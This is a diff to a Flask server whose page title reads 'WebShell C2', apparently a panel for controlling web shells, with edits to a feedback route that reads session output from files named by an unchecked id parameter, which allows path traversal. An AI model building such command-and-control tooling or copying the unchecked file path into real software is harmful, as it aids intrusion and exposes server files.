@@ -80,7 +80,7 @@ app = Flask(__name__)
 
 @app.route('/')
 def my_form():
-    return "<body style='text-align:center;line-weight:100%;'><h1 style='text-align:center;'>WebShell C2</h1><a href='/account' style='width:100%;text-align:center;'>http://server/account/</a></body>"
+    return render_template("index.html")
 
 @app.route("/get_id/")
 def get_id():
@@ -186,6 +186,7 @@ def feedback():
     if request.method=="POST":
         if request.args.get('password'):
             if request.args.get('id'):
+                id=request.args.get('id')
                 with open(f"./data/{id}",'r') as file:
                     data = file.read()
                 return render_template("feedback.html",content=data)
@@ -202,8 +203,11 @@ def feedback():
         return render_template("feedback.html",error="Please Set a Password")
     else:
         if request.args.get('id'):
-            with open(f"./data/{request.args.get('id')}",'r') as file:
-                data = file.read()
+            try:
+                with open(f"./data/{request.args.get('id')}",'r') as file:
+                    data = file.read()
+            except:
+                return render_template("feedback.html",error="Innexistant session, send a command first.")
             return render_template("feedback.html",content=data,url="/feedback/"+admin_token+f"?password={admin_password}&id={request.args.get('id')}")
         else:
             return render_template("feedback.html")
